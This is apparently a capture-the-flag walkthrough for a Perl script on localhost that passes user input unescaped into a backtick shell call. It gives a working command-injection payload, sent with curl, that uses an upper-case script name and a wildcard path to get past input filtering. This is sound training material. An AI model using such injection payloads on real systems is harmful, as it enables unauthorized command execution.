# In the home repository we can found a perl script that is executed on localhost:4646
# We can see that the program takes two params ('x' and 'y') where x is used in the t function
# The 'y' variable is useless
# We can see a regex is executed on the 'x' param

  9   $xx =~ tr/a-z/A-Z/;
 10   $xx =~ s/\s.*//;

# All letters is now upper and all spaces are deleted
# We can see on the next line the potential exploit where bash command is executed

 11   @output = `egrep "^$xx" /tmp/xd 2>&1`;

# Because of the regex we can't even try to execute `getflag > FILE` but we can try to execute file created in UPPERCASE
# Let's create a sh script which will execute getflag and redirect the output in a file to access to it

 #!/bin/sh
 getflag > /tmp/flag

# Move this script in /tmp folder and give execution access to it

chmod +x /tmp/GETFLAG

# Execute the curl command with * identifier to avoid CAPS on /tmp folder

curl localhost:4646?='`/*/GETFLAG`'
cat /tmp/flag
